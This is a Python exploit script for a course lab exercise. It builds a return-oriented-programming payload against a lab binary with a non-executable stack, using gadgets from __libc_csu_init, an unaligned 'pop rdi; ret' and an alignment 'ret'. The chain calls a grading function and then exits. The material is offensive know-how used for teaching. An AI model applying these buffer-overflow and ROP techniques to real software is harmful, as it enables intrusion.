#!/usr/bin/env python3
"""Lab 3 / Task 3 -- attack/dark-calc-nx: ROP (NX stack, ASLR, non-PIE).

dark-calc-nx runs on the ordinary, randomized and non-executable stack, so we
cannot execute code placed there.  The binary is a non-PIE executable, though,
so the addresses of its .text section never change and we can "program" by
chaining together code fragments (gadgets) that already exist in the binary.

Gadgets used (all inside the 0x4019d0..0x401ae3 window of __libc_csu_init):

    0x401a34  ret             ; a plain 0xc3, used only for stack alignment
    0x401a33  pop rdi ; ret   ; misaligned entry into 41 5f c3
                                (0x401a32: 41 5f = pop r15 ; 0x401a34: ret)
    0x4016e0  exit@plt
    0x401978  grade_eval

Note that 0x401a33 is *inside* the `pop r15; ret` instruction: x86 has
variable-length instructions, so a jump into the middle of an instruction is
perfectly legal.  This "unaligned gadget" trick is standard in ROP.

The chain (after input()'s `ret`):

    return address -> ret            ; slide by 8 bytes for 16-byte alignment
                   -> pop rdi ; ret  ; rdi = 4
                   -> 4
                   -> grade_eval     ; printf("\\n... Hope %c ...", 'A')
                   -> exit@plt       ; clean exit

Stack alignment: the SysV ABI requires RSP % 16 == 8 when a function is
entered (i.e. RSP % 16 == 0 right before `call`).  At input()'s `ret` the
return-address slot is 8 (mod 16), so a chain that starts directly with
`pop rdi; ret` enters grade_eval with RSP % 16 == 0 and some glibc builds then
fault inside printf (which uses `movaps` on its stack frame).  The leading
`ret` shifts everything by 8 bytes and restores the required alignment; see
the report for the measured values with and without it.

``input()`` also does ``strcpy(command_buf, expression)`` (command_buf is at
0x602090, only 31 bytes).  Our payload starts with p64(grade_eval), whose
little-endian bytes contain 0x00, so strcpy() stops after 3 bytes and the rest
of .bss is never touched.  The chain itself does not rely on command_buf.
"""
import struct
import sys

GRADE_EVAL  = 0x401978
EXIT_PLT    = 0x4016E0
RET         = 0x401A34   # plain `ret`
POP_RDI     = 0x401A33   # 5f c3  ->  pop rdi ; ret
COMMAND_BUF = 0x602090   # destination of input()'s strcpy (not used by chain)


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def main() -> None:
    payload = p64(GRADE_EVAL)       # expression[0:8]; also stops strcpy()
    payload += b"A" * 8             # expression[8:16]
    payload += b"B" * 8             # saved RBP
    payload += p64(RET)             # alignment slide
    payload += p64(POP_RDI)         # rdi = 4
    payload += p64(4)
    payload += p64(GRADE_EVAL)      # grade_eval(4)
    payload += p64(EXIT_PLT)        # exit

    assert b"\x0a" not in payload
    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
